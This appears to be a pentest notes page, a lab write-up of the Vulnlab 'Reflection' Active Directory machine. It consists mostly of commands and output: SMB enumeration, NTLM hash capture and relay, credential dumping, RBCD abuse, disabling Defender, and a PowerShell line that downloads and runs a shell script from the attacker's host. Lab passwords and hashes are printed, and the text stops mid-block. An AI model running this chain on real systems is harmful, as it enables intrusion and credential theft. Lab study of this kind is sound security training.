+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+		</div>
+		
+		<nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
+			<div class="page-links">
+  
+</div>
+
+		</nav>
+		<main class="docs-content col-lg-11 col-xl-9">
+		
+			<h1>Reflection</h1>
+			
+			<nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation">
+				
+			</nav>
+			<p>Scan</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2024-08-27 13:55:52Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: reflection.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp open  tcpwrapped
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: -1s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2024-08-27T13:55:56
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required</span></span></code></pre></div>
+  </figure>
+</div>
+<p>MS01</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-08-27T13:57:42+00:00<span class="p">;</span> -2s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ms01.reflection.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-08-26T13:54:12
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-02-25T13:54:12
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: REFLECTION
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: REFLECTION
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: MS01
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: reflection.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: ms01.reflection.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Tree_Name: reflection.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.20348
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2024-08-27T13:57:36+00:00
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
+</span></span><span class="line"><span class="cl">1433/tcp  open  ms-sql-s
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server
+</span></span><span class="line"><span class="cl">5985/tcp  open  wsman
+</span></span><span class="line"><span class="cl">49668/tcp open  unknown
+</span></span><span class="line"><span class="cl">49675/tcp open  unknown</span></span></code></pre></div>
+  </figure>
+</div>
+<p>WS01</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-08-27T13:59:06+00:00<span class="p">;</span> -1s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ws01.reflection.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-08-26T13:56:51
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-02-25T13:56:51
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: REFLECTION
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: REFLECTION
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: WS01
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: reflection.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: ws01.reflection.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Tree_Name: reflection.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.19041
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2024-08-27T13:58:26+00:00
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: -1s, deviation: 0s, median: -1s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2024-08-27T13:58:29
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:</span></span></code></pre></div>
+  </figure>
+</div>
+<p>Enum :</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">netexec smb <span class="nv">$t2</span> -u <span class="s2">&#34;Guest&#34;</span> -p <span class="s2">&#34;&#34;</span> --shares
+</span></span><span class="line"><span class="cl">smbclient <span class="se">\\\\</span><span class="nv">$t2</span><span class="se">\\</span>staging -U reflection.vl/Guest</span></span></code></pre></div>
+  </figure>
+</div>
+<p>Creds :</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">user</span><span class="o">=</span>web_staging
+</span></span><span class="line"><span class="cl"><span class="nv">password</span><span class="o">=</span>Washroom510
+</span></span><span class="line"><span class="cl"><span class="nv">db</span><span class="o">=</span>staging#</span></span></code></pre></div>
+  </figure>
+</div>
+<p>Sql :</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mssqlclient.py reflection/web_staging:Washroom510@<span class="nv">$t2</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>New creds  :</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">id   username   password
+</span></span><span class="line"><span class="cl">--   --------   -------------
+</span></span><span class="line"><span class="cl"> <span class="m">1</span>   b<span class="s1">&#39;dev01&#39;</span>   b<span class="s1">&#39;Initial123&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="m">2</span>   b<span class="s1">&#39;dev02&#39;</span>   b<span class="s1">&#39;Initial123&#39;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>Catch hash :</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">EXEC master.sys.xp_dirtree <span class="s1">&#39;\\10.8.3.12\myshare&#39;</span>,1,1
+</span></span><span class="line"><span class="cl">responder --interface <span class="s2">&#34;tun0&#34;</span> -wd</span></span></code></pre></div>
+  </figure>
+</div>
+<p>hash:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <pre tabindex="0"><code>[SMB] NTLMv2-SSP Client   : 10.10.231.70
+[SMB] NTLMv2-SSP Username : REFLECTION\svc_web_staging
+[SMB] NTLMv2-SSP Hash     : svc_web_staging::REFLECTION:1122334455667788:E571FE0EBECB9CB8DB559D27EBE656EB:0101000000000000003D84A55EF9DA019EA269D8030FBA090000000002000800430053003900500001001E00570049004E002D0048004D0031004A004A00430044004B00530030004A0004003400570049004E002D0048004D0031004A004A00430044004B00530030004A002E0043005300390050002E004C004F00430041004C000300140043005300390050002E004C004F00430041004C000500140043005300390050002E004C004F00430041004C0007000800003D84A55EF9DA010600040002000000080030003000000000000000000000000030000027C118CC925121058025F73FFB610BAD0E485878B21AE520900B1841F0D366EC0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0033002E00310032000000000000000000</code></pre>
+  </figure>
+</div>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ntlmrelayx.py -tf host -smb2support -socks
+</span></span><span class="line"><span class="cl">proxychains smbclient.py //10.10.231.71 -U REFLECTION/SVC_WEB_STAGING
+</span></span><span class="line"><span class="cl">proxychains smbclient.py <span class="s1">&#39;reflection&#39;</span>/SVC_WEB_STAGING@10.10.211.230
+</span></span><span class="line"><span class="cl"><span class="c1">#or</span>
+</span></span><span class="line"><span class="cl">ntlmrelayx.py -tf host -smb2support -i
+</span></span><span class="line"><span class="cl">nc 127.0.0.1 <span class="m">11000</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>New creds :</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">user</span><span class="o">=</span>web_prod
+</span></span><span class="line"><span class="cl"><span class="nv">password</span><span class="o">=</span>Tribesman201
+</span></span><span class="line"><span class="cl"><span class="nv">db</span><span class="o">=</span>prod</span></span></code></pre></div>
+  </figure>
+</div>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains -q nxc smb 10.10.231.69 -u SVC_WEB_STAGING -d REFLECTION -p <span class="s2">&#34;&#34;</span> --rid-brute <span class="p">|</span> grep <span class="s1">&#39;\\&#39;</span> <span class="p">|</span> cut -d <span class="s1">$&#39;\\&#39;</span> -f2 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 <span class="p">|</span> tee -a users_rid.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">netexec smb 10.10.231.69 10.10.231.71 10.10.231.70 -u users_rid.txt -p <span class="s2">&#34;Tribesman201&#34;</span> --no-bruteforce --continue-on-success
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mssqlclient.py reflection/web_prod:Tribesman201@<span class="nv">$t1</span>
+</span></span><span class="line"><span class="cl">EXEC master.sys.xp_dirtree <span class="s1">&#39;\\10.8.3.12\myshare&#39;</span>,1,1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="m">1</span>   b<span class="s1">&#39;abbie.smith&#39;</span>   b<span class="s1">&#39;CMe1x+nlRaaWEw&#39;</span>
+</span></span><span class="line"><span class="cl"> <span class="m">2</span>   b<span class="s1">&#39;dorothy.rose&#39;</span>  b<span class="s1">&#39;hC_fny3OK9glSJ&#39;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>New hash :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">svc_web_prod::REFLECTION:1122334455667788:295501EFF7AD61355C78FF22D9829E72:010100000000000000608A0DFFF9DA01CB89B8936F2120F300000000020008004A005A004B00550001001E00570049004E002D0047005400590056004400530045004F0043004A00360004003400570049004E002D0047005400590056004400530045004F0043004A0036002E004A005A004B0055002E004C004F00430041004C00030014004A005A004B0055002E004C004F00430041004C00050014004A005A004B0055002E004C004F00430041004C000700080000608A0DFFF9DA0106000400020000000800300030000000000000000000000000300000B0270D3322128C9BC7D2F3E0AA6C18EC8D3C58D513D3B9C3B59E6B274E4D01DF0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0033002E00310032000000000000000000</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enum :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bloodhound-python -d <span class="s1">&#39;reflection.vl&#39;</span> -u <span class="s1">&#39;dorothy.rose&#39;</span> -p <span class="s1">&#39;hC_fny3OK9glSJ&#39;</span> -ns 10.10.211.230 -dc reflection.vl -c all</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Foothold :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">netexec smb 10.10.211.230 -u abbie.smith -p <span class="s2">&#34;CMe1x+nlRaaWEw&#34;</span> --laps
+</span></span><span class="line"><span class="cl">evil-winrm -i 10.10.212.150 -u <span class="s2">&#34;Administrator&#34;</span> -p <span class="s2">&#34;H447.++h6g5}xi&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>Machine 1 VL{0d0a7b68ddc98dba0a3eb5e9b8a409ff}</p>
+<p>Dumping creds :</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">netexec smb 10.10.212.150 -u <span class="s2">&#34;Administrator&#34;</span> -p <span class="s2">&#34;H447.++h6g5}xi&#34;</span> --dpapi --local-auth
+</span></span><span class="line"><span class="cl">secretsdump <span class="s1">&#39;ms01/administrator:H447.++h6g5}xi@10.10.234.54&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">REFLECTION<span class="se">\G</span>eorgia.Price:DBl+5MPkpJg5id</span></span></code></pre></div>
+  </figure>
+</div>
+<p>RBCD :</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># Read the attribute</span>
+</span></span><span class="line"><span class="cl">rbcd.py -delegate-to <span class="s1">&#39;ws01$&#39;</span> -dc-ip <span class="s1">&#39;dc$&#39;</span> -action <span class="s1">&#39;read&#39;</span> <span class="s1">&#39;reflection.vl&#39;</span>/<span class="s1">&#39;Georgia.Price&#39;</span>:<span class="s1">&#39;DBl+5MPkpJg5id&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity</span>
+</span></span><span class="line"><span class="cl">rbcd.py -delegate-from <span class="s1">&#39;ms01$&#39;</span> -delegate-to <span class="s1">&#39;ws01$&#39;</span> -dc-ip <span class="s1">&#39;$dc&#39;</span> -action <span class="s1">&#39;write&#39;</span> <span class="s1">&#39;reflection.vl&#39;</span>/<span class="s1">&#39;Georgia.Price&#39;</span>:<span class="s1">&#39;DBl+5MPkpJg5id&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">getST.py -spn <span class="s1">&#39;cifs/ws01.reflection.vl&#39;</span> -impersonate Administrator -dc-ip <span class="s1">&#39;$DC&#39;</span> <span class="s1">&#39;REFLECTION.VL/MS01$&#39;</span> -hashes :c1658a71853a7f23f7ff13cd1c7ee10a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</span></span><span class="line"><span class="cl">nxc smb 10.10.202.39 --use-kcache --lsa --sam --dpapi</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Foothold :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">atexec.py -hashes <span class="s1">&#39;:a29542cb2707bf6d6c1d2c9311b0ff02&#39;</span> <span class="s1">&#39;ws01&#39;</span>/<span class="s1">&#39;Administrator&#39;</span>@<span class="s1">&#39;10.10.202.39&#39;</span> whoami
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nxc smb 10.10.202.39 --use-kcache -x <span class="s2">&#34;powershell.exe Set-MpPreference -DisableRealtimeMonitoring </span><span class="nv">$true</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">nxc smb 10.10.202.39 --use-kcache -x <span class="s2">&#34;powershell.exe IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://10.8.3.12:8080/shell.ps1&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">password: knh1gJ8Xmeq+uP <span class="c1">#password spraying</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>New creds :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Rhys.Garner : knh1gJ8Xmeq+uP
